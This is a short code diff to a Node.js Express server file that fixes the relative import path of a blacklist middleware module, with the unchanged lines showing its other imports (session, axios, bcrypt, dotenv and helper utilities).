@@ -4,7 +4,7 @@ import session from "express-session";
 import axios from "axios";
 import { buildMessage, buildTelButtons, isAutopilotOn, getClientIP, getReqClientIP, getNextPage, buildUserInfo, setWebhook, handleAdminCommand, systemInfo, sendAPIRequest, requireAdmin, routeMap, getPageFlow, savePageFlow } from "../utils.js";
 import capRouter, { requireCap } from "../altcheck.js";
-import { addToBlacklist, removeFromBlacklist, } from './middleware/frontblock.js';
+import { addToBlacklist, removeFromBlacklist, } from '../middleware/frontblock.js';
 import dotenv from "dotenv";
 import bcrypt from "bcrypt";
 dotenv.config();
